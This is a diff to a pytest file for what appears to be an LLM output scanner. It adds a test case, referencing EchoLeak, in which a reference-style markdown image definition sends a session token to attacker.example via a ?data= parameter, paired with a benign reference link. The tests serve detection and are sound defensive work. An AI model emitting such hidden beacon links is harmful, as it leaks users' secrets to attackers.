@@ -204,6 +204,18 @@ HARDENED = [
         "![diagram](https://raw.githubusercontent.com/owner/repo/main/d.png)",
         id="O2.1-trusted-host-exfil-param",
     ),
+    # O2.1 EchoLeak reference-style markdown: the beacon hides in an out-of-line
+    # link DEFINITION ("[1]: url") that the inline ![](url) rule misses. The
+    # malicious def carries a STRICT exfil param (?data=) on a non-trusted host;
+    # the benign sibling is an ordinary reference link (incl. an ambiguous ?q=
+    # search param) that MUST stay clean.
+    pytest.param(
+        "See the logo ![logo][1] below.\n\n"
+        "[1]: https://attacker.example/log?data=SESSION_TOKEN_abc",
+        "See the [documentation][1] below.\n\n"
+        "[1]: https://example.com/docs/guide?q=output-scanner",
+        id="O2.1-echoleak-reference-style",
+    ),
 ]
 
 
